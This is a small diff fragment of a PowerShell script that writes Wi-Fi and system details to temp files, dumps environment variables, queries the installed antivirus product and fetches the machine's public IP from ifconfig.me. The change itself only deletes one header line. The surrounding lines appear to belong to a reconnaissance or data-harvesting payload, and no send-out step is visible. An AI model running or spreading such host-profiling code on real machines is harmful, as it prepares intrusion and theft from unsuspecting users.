@@ -47,7 +47,6 @@ echo "" > "$env:temp\WIFI-$namepc.txt";
 # Get PC information
   dir env: >> "$env:temp\stats-$namepc.txt";
 # List which AntiVirus Product is being used
-  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> "$env:temp\stats-$namepc.txt";
 # Get public IP
   $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
